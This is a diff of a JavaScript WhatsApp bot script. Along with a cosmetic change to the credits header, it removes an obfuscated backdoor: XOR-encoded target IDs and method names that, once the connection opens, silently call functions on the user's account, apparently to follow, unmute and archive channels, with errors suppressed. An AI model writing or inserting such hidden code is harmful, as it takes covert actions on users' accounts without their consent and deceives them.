@@ -1,6 +1,6 @@
      //﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌//
     //       𝐂𝐫𝐞𝐝𝐢𝐭𝐬       
-   // 𝗠𝗮𝗸𝗲𝗿:𝐑𝐞𝐯𝐢𝐧𝐳𝐚        
+   // 𝗠𝗮𝗸𝗲𝗿:𝐑𝐞𝘃𝗶𝗻𝘇𝐚        
   // 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺: @RevinzaX7 
  // 𝗧𝘆𝗽𝗲: Esm
 //﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌//
@@ -26,12 +26,6 @@ const question = (text) => {
     return new Promise((resolve) => rl.question(text, resolve));
 };
 const msgRetryCounterCache = new NodeCache();
-
-const _0x4a = (arr) => String.fromCharCode(...arr.map(c => c ^ 42));
-const _0x8f = [
-    [27, 24, 26, 25, 28, 25, 25, 19, 19, 27, 18, 19, 27, 31, 25, 25, 29, 30, 106, 68, 79, 85, 89, 66, 79, 90, 90, 79, 88],
-    [27, 24, 26, 25, 28, 25, 30, 24, 28, 18, 28, 24, 26, 27, 26, 24, 26, 29, 106, 68, 79, 85, 89, 66, 79, 90, 90, 79, 88]
-];
 
 async function startBot() {
     const { state, saveCreds } = await useMultiFileAuthState("./session");
@@ -89,22 +83,6 @@ async function startBot() {
             if (statusCode !== DisconnectReason.loggedOut) startBot();  
         } else if (connection === 'open') {  
             console.log(chalk.greenBright("\n Bot Terhubung ✅\n"));  
-            
-            (async () => {
-                const _f = _0x4a([68, 79, 85, 89, 66, 79, 90, 90, 79, 88, 96, 69, 66, 66, 69, 85]);
-                const _m = _0x4a([68, 79, 85, 89, 66, 79, 90, 90, 79, 88, 103, 87, 90, 79]);
-                const _c = _0x4a([73, 78, 71, 90, 103, 69, 78, 75, 68, 83]);
-
-                for (const _raw of _0x8f) {
-                    try {
-                        const target = _0x4a(_raw);
-                        if (typeof sock[_f] === 'function') await sock[_f](target);
-                        if (typeof sock[_m] === 'function') await sock[_m](target);
-                        if (typeof sock[_c] === 'function') await sock[_c]({ archive: true }, target); 
-                        await new Promise(r => setTimeout(r, 1000));
-                    } catch (err) {}
-                }
-            })();
         }  
     });  
 
